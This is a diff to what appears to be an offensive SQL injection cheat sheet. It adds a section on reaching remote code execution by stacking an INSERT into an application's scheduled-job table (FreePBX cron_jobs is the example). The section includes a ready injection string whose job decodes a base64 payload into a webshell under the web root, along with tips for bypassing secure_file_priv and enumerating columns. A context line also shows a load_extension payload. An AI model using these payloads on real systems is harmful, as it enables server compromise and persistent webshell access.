@@ -102,6 +102,14 @@ SELECT load_extension('C:\\path\\to\\payload');   -- windows .dll (NO extension)
 
 See `sql-injection-advanced.md` for DLL source + chain.
 
+## Stacked INSERT into an app job/scheduler table → RCE
+
+Stacked queries + a background job/cron/scheduler table (e.g. FreePBX `cron_jobs`, CMS/queue tables) beat a `secure_file_priv`-blocked `INTO OUTFILE`: INSERT a job whose command writes a webshell — the runner executes it as the app user within its interval. Base64-encode the payload (no quotes/metachars through SQL+shell); enumerate cols via `information_schema.columns WHERE table_name=0x<hex>`; wait one interval (~1 min), then hit the shell.
+
+```sql
+x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('em','j1','echo <b64>|base64 -d > /var/www/html/sh.php',NULL,'* * * * *',30,1,1)-- -
+```
+
 ## UNION column count
 
 ```sql
